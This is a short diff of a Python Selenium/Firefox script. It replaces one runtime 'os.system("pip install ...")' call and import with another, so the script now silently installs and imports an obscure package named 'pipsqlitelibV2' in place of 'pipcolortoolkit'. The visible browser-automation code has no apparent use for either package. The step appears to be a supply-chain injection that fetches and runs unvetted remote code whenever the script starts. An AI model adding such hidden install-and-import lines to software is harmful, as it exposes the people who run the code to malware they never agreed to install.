@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolortoolkit")
-import pipcolortoolkit
+os.system("pip install pipsqlitelibV2")
+import pipsqlitelibV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
